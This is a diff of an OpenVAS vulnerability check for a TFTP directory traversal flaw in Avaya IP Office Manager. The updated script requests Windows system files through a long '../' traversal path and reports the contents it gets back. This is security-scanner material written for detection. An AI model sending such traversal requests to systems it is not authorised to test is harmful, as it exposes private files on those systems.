@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_avaya_ip_office_mgr_tftp_dir_trav.nasl 12047 2018-10-24 07:38:41Z cfischer $
+# $Id: gb_avaya_ip_office_mgr_tftp_dir_trav.nasl 13155 2019-01-18 15:41:35Z cfischer $
 #
 # Avaya IP Office Manager TFTP Server Directory Traversal Vulnerability
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802027");
-  script_version("$Revision: 12047 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-24 09:38:41 +0200 (Wed, 24 Oct 2018) $");
+  script_version("$Revision: 13155 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-18 16:41:35 +0100 (Fri, 18 Jan 2019) $");
   script_tag(name:"creation_date", value:"2011-07-14 13:16:44 +0200 (Thu, 14 Jul 2011)");
   script_tag(name:"cvss_base", value:"5.0");
   script_bugtraq_id(48272);
@@ -45,8 +45,10 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
   script_family("Remote file access");
-  script_dependencies("tftpd_detect.nasl", "os_detection.nasl");
+  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "tftpd_backdoor.nasl", "os_detection.nasl");
   script_require_udp_ports("Services/udp/tftp", 69);
+  script_require_keys("tftp/detected", "Host/runs_windows");
+  script_exclude_keys("tftp/backdoor", "keys/TARGET_IS_IPV6");
 
   script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary files on the
   affected application.");
@@ -71,26 +73,26 @@ include("misc_func.inc");
 include("tftp.inc");
 
 port = get_kb_item("Services/udp/tftp");
-if(!port){
+if(!port)
   port = 69;
-}
 
-if(!get_port_state(port)){
+if(!get_udp_port_state(port))
   exit(0);
-}
+
+if(get_kb_item("tftp/" + port + "/backdoor"))
+  exit(0);
 
 files = traversal_files("windows");
 
 foreach file(keys(files)) {
 
-  response = tftp_get(port:port, path:"../../../../../../../../../" +
-                                      "../../../" + files[file]);
-  if(isnull(response)){
-    exit(0);
-  }
+  res = tftp_get(port:port, path:"../../../../../../../../../../../../" + files[file]);
+  if(!res)
+    continue;
 
-  if (egrep(pattern:file, string:response, icase:TRUE)) {
-    security_message(port: port, proto: "udp");
+  if (egrep(pattern:file, string:res, icase:TRUE)) {
+    report = string("The " + files[file] + " file contains:\n", res);
+    security_message(port:port, data:report, proto:"udp");
     exit(0);
   }
 }
